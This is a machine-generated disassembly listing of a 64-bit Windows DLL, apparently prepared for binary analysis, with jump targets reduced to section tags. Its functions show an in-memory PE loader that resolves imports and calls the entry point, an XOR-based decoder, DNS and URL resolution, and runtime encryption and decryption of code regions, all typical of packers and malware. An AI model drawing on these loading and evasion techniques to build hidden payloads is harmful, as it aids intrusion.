jl r-xdata
add r8 r13
add r10 rsi
movzx eax [ r10 ]
add eax 0x1f
cdqe
add r8 rax
add r10 rsi
mov al [ r10 ]
add r10 rsi
mov [ r11 ] al
add r11 rsi
sub r8 rsi
jne r-xdata
add r8 r13
add r10 rsi
movzx eax [ r10 ]
add eax 0x7
cdqe
add r8 rax
add r10 rsi
mov eax [ rdx ]
add rdx 0x4
mov [ r11 ] eax
add r11 0x4
sub r8 0x2
jmp r-xdata
mov eax [ rdx ]
sub r8 0x4
add rdx 0x4
mov [ r11 ] eax
add r11 0x4
cmp r8 0x4
jae r-xdata
test r8 r8
je r-xdata
mov al [ rdx ]
add rdx rsi
mov [ r11 ] al
add r11 rsi
sub r8 rsi
jne r-xdata
jmp r-xdata
sub_180005200
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x300
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x2f0 ] rax
mov rsi rcx
lea rcx [ rw-data ]
call [ LoadLibraryA@IAT ]
lea rdx [ rw-data ]
mov rcx rax
call [ GetProcAddress@IAT ]
and [ rsp + 0x20 ] 0x0
lea rdx [ rsp + 0x20 ]
lea rcx [ rsp + 0x30 ]
mov rdi rax
call rdi
cmp eax 0x6f
jne r-xdata
xor eax eax
mov ebx [ rsp + 0x20 ]
call [ GetProcessHeap@IAT ]
mov r8d ebx
mov rcx rax
xor edx edx
call [ HeapAlloc@IAT ]
mov rbx rax
test rax rax
jne r-xdata
lea rdx [ rsp + 0x20 ]
mov rcx rax
call rdi
test eax eax
jne r-xdata
call [ GetProcessHeap@IAT ]
xor r8d r8d
jmp r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rbx
mov rcx rbx
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
call [ GetProcessHeap@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
mov eax 0x1
jmp r-xdata
mov rcx [ rcx ]
test rcx rcx
jne r-xdata
mov rcx [ rsp + 0x2f0 ]
xor rcx rsp
call sub_180006220
lea r11 [ rsp + 0x300 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
mov rax [ rcx + 0x198 ]
mov [ rsi ] rax
test rax rax
jne r-xdata
sub_18000530c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov rdi rcx
mov rcx [ rcx ]
mov bpl r9b
movsxd rsi r8d
mov r12 rdx
test rcx rcx
je r-xdata
lea eax [ rsi + 0x2 ]
movsxd rbx eax
mov rcx rbx
call j_sub_180006294
mov r8 rbx
xor edx edx
mov rcx rax
mov [ rdi ] rax
call sub_180008e40
mov rcx [ rdi ]
mov r8 rsi
mov rdx r12
call sub_180006a70
mov rbx [ rsp + 0x30 ]
test bpl bpl
mov rbp [ rsp + 0x38 ]
mov [ rdi + 0x8 ] esi
mov rsi [ rsp + 0x40 ]
setne al
mov [ rdi + 0xc ] al
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
call j_sub_180006da4
and [ rdi ] 0x0
sub_1800053b8
xor r9d r9d
cmp [ rcx + 0xc ] r9b
je r-xdata
mov rax [ rcx ]
retn
mov r8d r9d
cmp [ rcx + 0x8 ] r9d
jbe r-xdata
mov [ rcx + 0xc ] r9b
mov rax [ rcx ]
mov edx r8d
inc r8d
xor [ rdx + rax ] 0x90
cmp r8d [ rcx + 0x8 ]
jb r-xdata
sub_1800053e8
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
call [ GetTickCount@IAT ]
mov [ rw-data ] 0x1
jmp r-xdata
imul eax eax 0x343fd
add eax 0x269ec3
mov [ rw-data ] eax
shr eax 0x10
and eax 0x7fff
add rsp 0x28
retn
sub_180005428
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rw-data ] 0x0
mov rbx rcx
jne r-xdata
xor edi edi
call [ GetTickCount@IAT ]
mov [ rw-data ] 0x1
mov [ rw-data ] eax
call sub_1800053e8
mov r11d eax
mov eax 0x4ec4ec4f
imul r11d
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add edx ecx
imul edx edx 0x1a
sub r11d edx
add r11b 0x61
mov [ rdi + rbx ] r11b
inc rdi
cmp rdi 0x3
jl r-xdata
mov [ rbx + 0x3 ] 0x0
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180005494
push rbx
sub rsp 0x30
cmp [ rcx ] 0x20
mov rbx rcx
jne r-xdata
cmp [ rbx ] 0x68
jne r-xdata
inc rbx
cmp [ rbx ] 0x20
je r-xdata
and [ rsp + 0x28 ] 0x0
mov edx 0x1
lea rax [ rsp + 0x40 ]
lea r8d [ rdx + 0x7 ]
xor r9d r9d
mov rcx rbx
mov [ rsp + 0x20 ] rax
call [ DnsQuery_A@IAT ]
test eax eax
je r-xdata
cmp [ rbx + 0x1 ] 0x74
jne r-xdata
mov rax [ rsp + 0x40 ]
mov ebx [ rax + 0x20 ]
mov ecx ebx
call [ inet_ntoa@IAT ]
mov ecx ebx
call [ inet_ntoa@IAT ]
mov rcx rax
call [ inet_addr@IAT ]
mov rcx rbx
call [ inet_addr@IAT ]
cmp eax 0xffffffff
jne r-xdata
cmp [ rbx + 0x2 ] 0x74
jne r-xdata
add rsp 0x30
pop rbx
retn
mov rcx rbx
call [ gethostbyname@IAT ]
test rax rax
je r-xdata
cmp [ rbx + 0x3 ] 0x70
jne r-xdata
mov rax [ rax + 0x18 ]
mov rcx [ rax ]
mov eax [ rcx ]
jmp r-xdata
cmp [ rbx + 0x4 ] 0x3a
jne r-xdata
cmp [ rbx + 0x5 ] 0x2f
jne r-xdata
cmp [ rbx + 0x6 ] 0x2f
jne r-xdata
add rbx 0x7
sub_180005550
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov rax [ r8 ]
mov r13 [ r8 + 0x8 ]
xor r15d r15d
mov rbp r8
movzx r8d [ rax + 0x14 ]
mov r12 rdx
mov r14 rcx
mov esi r15d
cmp r15w [ rax + 0x6 ]
jae r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea rdi [ r8 + rax + 0x28 ]
mov ecx [ rdi - 0x4 ]
mov edx [ rdi ]
mov r9d 0x4
add rcx r13
mov r8d 0x1000
call [ VirtualAlloc@IAT ]
mov edx [ rdi + 0x4 ]
mov r8d [ rdi ]
add rdx r14
mov rcx rax
mov rbx rax
call sub_180006a70
mov [ rdi - 0x8 ] ebx
cmp [ r12 + 0x38 ] r15d
jle r-xdata
cmp [ rdi ] r15d
jne r-xdata
mov rax [ rbp ]
inc esi
add rdi 0x28
movzx ecx [ rax + 0x6 ]
cmp esi ecx
jl r-xdata
movsxd rbx [ r12 + 0x38 ]
mov ecx [ rdi - 0x4 ]
mov r9d 0x4
add rcx r13
mov rdx rbx
mov r8d 0x1000
call [ VirtualAlloc@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
mov [ rdi - 0x8 ] eax
call sub_180008e40
jmp r-xdata
sub_18000563c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x20
mov r8 [ rcx ]
xor r12d r12d
mov rbp rcx
mov rdi [ r8 + 0x30 ]
movzx eax [ r8 + 0x14 ]
mov rcx 0xffffffff00000000
and rdi rcx
mov esi r12d
cmp r12w [ r8 + 0x6 ]
jae r-xdata
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
lea rbx [ rax + r8 + 0x3c ]
test [ rbx ] 0x4000000
movsxd rcx eax
movsxd rax edx
lea rdx [ rax + rcx * 2 ]
lea rax [ rw-data ]
lea rcx [ r9 + rdx * 2 ]
mov r10d [ rax + rcx * 4 ]
je r-xdata
mov ecx [ rbx - 0x1c ]
mov edx [ rbx - 0x14 ]
mov r8d 0x4000
or rcx rdi
call [ VirtualFree@IAT ]
jmp r-xdata
mov eax [ rbx - 0x14 ]
test eax eax
jne r-xdata
bts r10d 0x9
mov r8 [ rbp ]
inc esi
add rbx 0x28
movzx eax [ r8 + 0x6 ]
cmp esi eax
jl r-xdata
mov ecx [ rbx - 0x1c ]
lea r9 [ rsp + 0x40 ]
mov edx eax
or rcx rdi
mov r8d r10d
call [ VirtualProtect@IAT ]
test [ rbx ] 0x40
je r-xdata
mov eax [ rbx ]
mov edx [ rbx ]
mov r9d [ rbx ]
shr eax 0x1d
shr edx 0x1e
shr r9d 0x1f
and eax 0x1
and edx 0x1
test [ rbx ] 0x2000000
je r-xdata
test [ rbx ] 0x80
je r-xdata
mov eax [ r8 + 0x20 ]
jmp r-xdata
mov eax [ r8 + 0x24 ]
test eax eax
je r-xdata
sub_18000573c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov rax [ rcx ]
mov r13 [ rcx + 0x8 ]
mov r12 rcx
cmp [ rax + 0x94 ] 0x0
mov edi 0x1
jbe r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov eax edi
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
mov esi [ rax + 0x90 ]
lea edx [ rdi + 0x13 ]
add rsi r13
mov rcx rsi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
add rsi 0x10
mov ecx [ rsi - 0x4 ]
add rcx r13
call [ LoadLibraryA@IAT ]
mov r14 rax
test rax rax
je r-xdata
xor edi edi
mov ecx [ r12 + 0x18 ]
inc ecx
movsxd rdx ecx
mov rcx [ r12 + 0x10 ]
shl rdx 0x3
call sub_1800070c8
mov [ r12 + 0x10 ] rax
test rax rax
je r-xdata
movsxd rcx [ r12 + 0x18 ]
mov [ rax + rcx * 8 ] r14
inc [ r12 + 0x18 ]
cmp [ rsi - 0x10 ] 0x0
je r-xdata
mov ebx [ rsi ]
add rbx r13
mov rbp rbx
mov ebx [ rsi - 0x10 ]
mov ebp [ rsi ]
add rbx r13
add rbp r13
jmp r-xdata
test edi edi
je r-xdata
sub rbp rbx
mov rax [ rbx ]
test rax rax
je r-xdata
add rsi 0x14
mov edx 0x14
lea rcx [ rsi - 0x10 ]
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
call [ GetProcAddress@IAT ]
mov [ rbx + rbp ] rax
test rax rax
je r-xdata
lea rdx [ rax + r13 + 0x2 ]
cmp [ rsi - 0x4 ] 0x0
je r-xdata
jmp r-xdata
xor edi edi
add rbx 0x8
mov rax [ rbx ]
test rax rax
jne r-xdata
mov rcx 0x8000000000000000
movzx edx ax
test rcx rax
mov rcx r14
jne r-xdata
jmp r-xdata
sub_180005890
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov eax 0x5a4d
mov r12 rcx
cmp [ rcx ] ax
jne r-xdata
xor eax eax
movsxd rsi [ rcx + 0x3c ]
add rsi rcx
cmp [ rsi ] 0x4550
jne r-xdata
mov edx [ rsi + 0x50 ]
mov rcx [ rsi + 0x30 ]
mov ebx 0x2000
mov r8d ebx
mov r9d 0x4
call [ VirtualAlloc@IAT ]
mov rbp rax
test rax rax
jne r-xdata
call [ GetProcessHeap@IAT ]
xor edx edx
lea r8d [ rdx + 0x20 ]
mov rcx rax
call [ HeapAlloc@IAT ]
mov ebx 0x1000
mov r9d 0x4
and [ rax + 0x18 ] 0x0
and [ rax + 0x10 ] 0x0
and [ rax + 0x1c ] 0x0
mov [ rax + 0x8 ] rbp
mov edx [ rsi + 0x50 ]
mov r8d ebx
mov rcx rbp
mov rdi rax
call [ VirtualAlloc@IAT ]
mov edx [ rsi + 0x54 ]
mov r9d 0x4
mov r8d ebx
mov rcx rbp
call [ VirtualAlloc@IAT ]
mov r8d [ rsi + 0x54 ]
mov rdx r12
add r8d [ r12 + 0x3c ]
mov rcx rax
mov rbx rax
call sub_180006a70
movsxd rax [ r12 + 0x3c ]
mov r8 rdi
add rax rbx
mov rdx rsi
mov rcx r12
mov [ rdi ] rax
mov [ rax + 0x30 ] rbp
call sub_180005550
mov rbx rbp
mov r12d 0x1
sub rbx [ rsi + 0x30 ]
je r-xdata
mov edx [ rsi + 0x50 ]
lea r9d [ rax + 0x4 ]
mov r8d ebx
xor ecx ecx
call [ VirtualAlloc@IAT ]
mov rbp rax
test rax rax
je r-xdata
mov rcx rdi
call sub_18000573c
test eax eax
je r-xdata
mov rax [ rdi ]
mov r11 [ rdi + 0x8 ]
cmp [ rax + 0xb4 ] 0x0
jbe r-xdata
mov rcx rdi
call sub_180005b4c
mov rcx rdi
call sub_18000563c
mov r11 [ rdi ]
cmp [ r11 + 0x28 ] 0x0
je r-xdata
mov edx [ rax + 0xb0 ]
add rdx r11
jmp r-xdata
mov rax rdi
jmp r-xdata
mov eax [ r11 + 0x28 ]
add rax rbp
je r-xdata
mov eax [ rdx ]
test eax eax
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
xor r8d r8d
mov edx r12d
mov rcx rbp
call rax
test eax eax
je r-xdata
mov r8d eax
mov eax [ rdx + 0x4 ]
xor r10d r10d
sub rax 0x8
add r8 r11
lea r9 [ rdx + 0x8 ]
test rax 0xfffffffffffffffe
jbe r-xdata
mov [ rdi + 0x1c ] r12d
mov eax [ rdx + 0x4 ]
add rdx rax
movzx eax [ r9 ]
mov ecx eax
shr eax 0xc
and ecx 0xfff
cmp eax 0x3
je r-xdata
movsxd rax ecx
add [ rax + r8 ] ebx
cmp eax 0xa
jne r-xdata
mov ecx [ rdx + 0x4 ]
add r10d r12d
add r9 0x2
sub rcx 0x8
mov eax r10d
shr rcx 0x1
cmp rax rcx
jb r-xdata
movsxd rax ecx
add [ rax + r8 ] rbx
jmp r-xdata
sub_180005a98
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov rax [ rcx ]
mov rdi [ rcx + 0x8 ]
cmp [ rax + 0x8c ] 0x0
je r-xdata
xor eax eax
mov ebx [ rax + 0x88 ]
add rbx rdi
mov eax [ rbx + 0x18 ]
test eax eax
je r-xdata
cmp [ rbx + 0x14 ] 0x0
je r-xdata
mov ebp [ rbx + 0x20 ]
mov esi [ rbx + 0x24 ]
xor r12d r12d
add rbp rdi
add rsi rdi
test eax eax
je r-xdata
mov edx [ rbp ]
lea rcx [ r--data ]
add rdx rdi
call sub_180007080
test eax eax
je r-xdata
movzx ecx [ rsi ]
cmp ecx 0xffffffff
je r-xdata
inc r12d
add rbp 0x4
add rsi 0x2
cmp r12d [ rbx + 0x18 ]
jb r-xdata
cmp ecx [ rbx + 0x14 ]
ja r-xdata
mov eax [ rbx + 0x1c ]
add rax rdi
mov eax [ rax + rcx * 4 ]
add rax rdi
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
sub_180005b4c
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
cmp [ rcx + 0x1c ] 0x0
mov rbx rcx
je r-xdata
cmp [ rbx + 0x10 ] 0x0
je r-xdata
mov rax [ rbx ]
mov rcx [ rcx + 0x8 ]
xor r8d r8d
mov r9d [ rax + 0x28 ]
xor edx edx
add r9 rcx
call r9
and [ rbx + 0x1c ] 0x0
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
xor esi esi
cmp [ rbx + 0x18 ] esi
jle r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
xor edx edx
mov r8d 0x8000
call [ VirtualFree@IAT ]
mov rcx [ rbx + 0x10 ]
call sub_180006da4
xor edi edi
inc esi
add rdi 0x8
cmp esi [ rbx + 0x18 ]
jl r-xdata
mov rcx [ rcx + rdi ]
call [ FreeLibrary@IAT ]
mov rcx [ rbx + 0x10 ]
cmp [ rcx + rdi ] 0xffffffffffffffff
je r-xdata
sub_180005bfc
mov [ rsp + 0x8 ] rbx
movzx r11d r8b
mov eax 0x55555556
mov ebx r9d
mov r9d edx
mov r8d r11d
mov r10 rcx
imul r11d
mov eax edx
shr eax 0x1f
add edx eax
lea eax [ rdx + rdx * 2 ]
sub r8d eax
jmp r-xdata
cmp r8d r9d
jl r-xdata
lea ecx [ r11 + r8 ]
and ecx 0x80000001
jge r-xdata
mov rbx [ rsp + 0x8 ]
retn
inc cl
test ebx ebx
je r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
sub [ r10 ] cl
add [ r10 ] cl
jmp r-xdata
movzx eax cl
add r8d eax
movzx eax cl
add r10 rax
sub_180005c60
mov [ rsp + 0x8 ] rbx
movzx eax r8b
mov ebx r9d
mov r11d edx
and eax 0x80000001
mov r10 rcx
jge r-xdata
inc al
movzx r8d al
mov edx r8d
cmp r8d r11d
jge r-xdata
dec eax
or eax 0xfffffffe
inc eax
mov rbx [ rsp + 0x8 ]
retn
movzx r9d al
and ecx 0x80000001
jge r-xdata
and ecx 0x80000001
jge r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
add [ r10 ] al
sub [ r10 ] al
jmp r-xdata
mov ecx edx
test ebx ebx
je r-xdata
add edx r8d
add r10 r9
cmp edx r11d
jl r-xdata
sub_180005cd8
push rbx
sub rsp 0x20
and r9d 0xf
mov ebx edx
dec r9d
je r-xdata
mov r8b [ r8 ]
dec r9d
je r-xdata
mov r8b [ r8 + 0x1 ]
jmp r-xdata
dec r9d
je r-xdata
mov r9d [ rsp + 0x50 ]
call sub_180005bfc
mov r8b [ r8 + 0x2 ]
jmp r-xdata
dec r9d
je r-xdata
mov r8b [ r8 + 0x1 ]
dec r9d
je r-xdata
mov eax ebx
add rsp 0x20
pop rbx
retn
mov r8b [ r8 + 0x2 ]
jmp r-xdata
dec r9d
jne r-xdata
mov r9d [ rsp + 0x50 ]
call sub_180005c60
jmp r-xdata
mov r8b [ r8 + 0x3 ]
jmp r-xdata
sub_180005d40
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdi
mov r9 [ rw-data ]
mov edi r8d
mov ebx edx
mov r10 rcx
test r9d r9d
jle r-xdata
mov eax 0x1
mov rcx [ rw-data ]
mov eax 0x5a4d
cmp [ rcx ] ax
je r-xdata
movsxd rax [ rcx + 0x3c ]
cmp [ rax + rcx ] 0x4550
jne r-xdata
xor eax eax
jmp r-xdata
mov r11d r10d
xor r8d r8d
sub r11d ecx
sub rcx [ rw-data ]
test r9 r9
je r-xdata
mov rbx [ rsp + 0x8 ]
mov rdi [ rsp + 0x10 ]
retn
lea rdx [ rw-data ]
inc r8d
add rdx 0x4
mov eax r8d
cmp rax r9
jb r-xdata
cmp eax ebx
jge r-xdata
mov eax [ rdx ]
sub eax r11d
js r-xdata
cdqe
add rax r10
test edi edi
je r-xdata
add [ rax ] rcx
sub [ rax ] rcx
jmp r-xdata
mov r9 [ rw-data ]
sub_180005de0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x30
cmp [ rw-data ] 0x0
mov rbx rdx
mov rdi rcx
jne r-xdata
lea rcx [ rw-data ]
call [ EnterCriticalSection@IAT ]
test dil 0x20
jne r-xdata
lea rcx [ rw-data ]
mov edx 0x3e8
call [ InitializeCriticalSectionAndSpinCount@IAT ]
lea rcx [ r--data ]
call [ GetModuleHandleA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
test rax rax
jne r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x70 ]
add rsp 0x30
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
test rdi rdi
je r-xdata
xor ecx ecx
call [ ExitProcess@IAT ]
mov r8 rbx
lea rdx [ rw-data ]
sub r8 [ rw-data ]
xor ecx ecx
inc ecx
add rdx 0x18
cmp ecx 0x100
jl r-xdata
mov r9 r8
sub r9 [ rdx + 0x4 ]
js r-xdata
cmp [ rdx + 0x4 ] 0x0
je r-xdata
or ecx 0xffffffff
movzx eax [ rdx ]
cmp r9 rax
jle r-xdata
movsxd rax ecx
lea r13 [ rw-data ]
lea rbp [ rax + rax * 2 ]
movzx esi [ r13 + rbp * 8 + 0x4 ]
test dil 0x10
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov rdi [ r13 + rbp * 8 + 0x10 ]
test rdi rdi
jne r-xdata
lea r9 [ rsp + 0x68 ]
movsxd rdx esi
mov r8d 0x40
mov rcx rbx
call [ rw-data ]
movzx r12d [ r13 + rbp * 8 + 0x6 ]
and [ rsp + 0x20 ] 0x0
lea r14 [ r13 + rbp * 8 ]
mov r9d r12d
mov r8 r14
mov edx esi
mov rcx rbx
call sub_180005cd8
cmp [ r13 + rbp * 8 + 0x10 ] 0x0
jne r-xdata
lea r8d [ rdi + 0x1 ]
mov edx esi
mov rcx rbx
call sub_180005d40
movsxd r12 esi
call [ GetProcessHeap@IAT ]
lea edx [ rdi + 0x8 ]
mov r8 r12
mov rcx rax
call [ HeapAlloc@IAT ]
mov rdi rax
test rax rax
je r-xdata
test rdi rdi
je r-xdata
xor r8d r8d
mov edx esi
mov rcx rbx
call sub_180005d40
mov r8 r12
mov rdx rbx
mov rcx rax
call sub_180006a70
test r12b 0x10
jne r-xdata
movsxd r8 esi
mov rdx rbx
mov rcx rdi
mov [ r13 + rbp * 8 + 0x10 ] rdi
call sub_180006a70
mov ebp 0x4
mov r13 r14
call [ GetTickCount@IAT ]
mov edx 0x269ec3
add eax edi
mov r8d [ rsp + 0x68 ]
lea r9 [ rsp + 0x68 ]
mov rdx rsi
mov rcx rbx
call [ rw-data ]
imul eax eax 0x343fd
dec ebp
add eax edx
mov ecx eax
shr ecx 0x10
mov [ r13 ] cl
inc r13
test ebp ebp
jg r-xdata
imul eax eax 0x343fd
mov r9d r12d
mov r8 r14
add eax edx
mov rcx rdi
mov edx esi
mov [ rw-data ] eax
mov [ rsp + 0x20 ] 0x1
call sub_180005cd8
sub_180005ffc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x30
mov r9 rdx
mov rbx rdx
lea rdx [ rw-data ]
sub r9 [ rw-data ]
xor ecx ecx
inc ecx
add rdx 0x18
cmp ecx 0x100
jl r-xdata
mov r8 r9
sub r8 [ rdx + 0x4 ]
js r-xdata
cmp [ rdx + 0x4 ] 0x0
je r-xdata
or ecx 0xffffffff
movzx eax [ rdx ]
cmp r8 rax
jle r-xdata
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x70 ]
add rsp 0x30
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
lea r14 [ rw-data ]
movsxd rax ecx
lea r12 [ rax + rax * 2 ]
movzx r13d [ r14 + r12 * 8 + 0x4 ]
movzx ebp [ r14 + r12 * 8 + 0x6 ]
sub rbx r13
test bpl 0x20
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
test ebp ebp
je r-xdata
mov edi ebp
and edi 0x10
jne r-xdata
mov rdx [ r14 + r12 * 8 + 0x10 ]
mov rcx rbx
test rdx rdx
jne r-xdata
lea r9 [ rsp + 0x68 ]
lea r8d [ rdi + 0x40 ]
mov edx r13d
mov rcx rbx
call [ rw-data ]
mov r8 r13
call sub_180006a70
lea r8 [ r14 + r12 * 8 ]
mov r9d ebp
mov edx r13d
mov [ rsp + 0x20 ] 0x1
call sub_180005cd8
jmp r-xdata
mov r8d [ rsp + 0x68 ]
lea r9 [ rsp + 0x68 ]
mov rdx r13
mov rcx rbx
call [ rw-data ]
test edi edi
jne r-xdata
sub_18000610c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx [ rcx ]
mov rdi rcx
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx ]
call [ CloseHandle@IAT ]
mov rcx rbx
call j_sub_180006da4#2
and [ rdi ] 0x0
sub_180006154
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_180007548
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180006da4#2
sub_1800061c2
mov rdx [ rsp + 0x10 ]
push rcx
push r8
push r9
sub rsp 0x30
call sub_180005ffc
add rsp 0x30
pop r9
pop r8
pop rcx
pop rdx
pop rbp
retn
sub_1800061e1
push rbp
push rdx
mov rdx [ rsp + 0x10 ]
push rcx
push r8
push r9
sub rsp 0x30
call sub_180005de0
add rsp 0x30
pop r9
pop r8
pop rcx
pop rdx
pop rbp
retn
sub_180006294
push rbx
sub rsp 0x40
mov rbx rcx
jmp r-xdata
call sub_180006de4
test rax rax
je r-xdata
mov rcx rbx
call sub_180007dd8
test eax eax
je r-xdata
add rsp 0x40
pop rbx
retn
mov eax [ rw-data ]
mov r8d 0x1
lea rbx [ r--data ]
test r8b al
jne r-xdata
mov rcx rbx
lea rdx [ rw-data ]
lea rcx [ rsp + 0x20 ]
call sub_180007594
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] rbx
call sub_180007e0c
int3
or eax r8d
lea rdx [ rsp + 0x58 ]
lea rcx [ rw-data ]
mov [ rw-data ] eax
lea rax [ r--data ]
mov [ rsp + 0x58 ] rax
call sub_180007420
lea rcx [ sub_180016388 ]
mov [ rw-data ] rbx
call sub_180007db8
sub_180006338
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
push rbp
push rbx
push rdi
mov rbp rsp
sub rsp 0x50
and [ rbp - 0x30 ] 0x0
mov rdi rdx
xor edx edx
mov rbx rcx
lea rcx [ rbp - 0x28 ]
lea r8d [ rdx + 0x28 ]
call sub_180008e40
test rdi rdi
jne r-xdata
test rbx rbx
je r-xdata
call sub_180006ee4
mov [ rax ] 0x16
call sub_180008e08
or eax 0xffffffff
jmp r-xdata
lea r9 [ rbp + 0x30 ]
lea rcx [ rbp - 0x30 ]
xor r8d r8d
mov rdx rdi
mov [ rbp - 0x28 ] 0x7fffffff
mov [ rbp - 0x18 ] 0x42
mov [ rbp - 0x20 ] rbx
mov [ rbp - 0x30 ] rbx
call sub_180008164
dec [ rbp - 0x28 ]
mov ebx eax
js r-xdata
add rsp 0x50
pop rdi
pop rbx
pop rbp
retn
lea rdx [ rbp - 0x30 ]
xor ecx ecx
call sub_180007ea0
mov rcx [ rbp - 0x30 ]
mov [ rcx ] 0x0
jmp r-xdata
mov eax ebx
sub_1800063d8
xor r11d r11d
mov r10 rdx
mov r8 rcx
cmp [ rdx ] r11b
jne r-xdata
mov al [ rcx ]
test al al
je r-xdata
mov rax rcx
retn
xor eax eax
retn
mov r9 rcx
sub r9 rdx
cmp [ rdx ] r11b
je r-xdata
cmp [ rdx ] r11b
je r-xdata
mov rax r8
retn
inc r8
inc r9
mov al [ r8 ]
test al al
jne r-xdata
movsx ecx [ r9 + rdx ]
movsx eax [ rdx ]
cmp ecx eax
jne r-xdata
mov rdx r10
test al al
je r-xdata
inc rdx
cmp [ r9 + rdx ] r11b
jne r-xdata
sub_18000643c
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx + 0x18 ] 0x0
test rdx rdx
jne r-xdata
movups xmm0 [ rdx ]
movdqu [ rcx ] xmm0
call sub_180007a4c
mov [ rbx + 0x10 ] rax
mov rdx [ rax + 0xc0 ]
mov [ rbx ] rdx
mov rcx [ rax + 0xb8 ]
mov [ rbx + 0x8 ] rcx
cmp rdx [ rw-data ]
je r-xdata
mov rax [ rw-data ]
cmp [ rbx + 0x8 ] rax
je r-xdata
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
mov rax [ rbx + 0x10 ]
test [ rax + 0xc8 ] 0x2
jne r-xdata
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_180009d14
mov [ rbx ] rax
mov rax rbx
add rsp 0x20
pop rbx
retn
or [ rax + 0xc8 ] 0x2
mov [ rbx + 0x18 ] 0x1
jmp r-xdata
call sub_180009444
mov [ rbx + 0x8 ] rax
sub_1800064e0
push rbp
push r12
push r13
sub rsp 0x60
lea rbp [ rsp + 0x50 ]
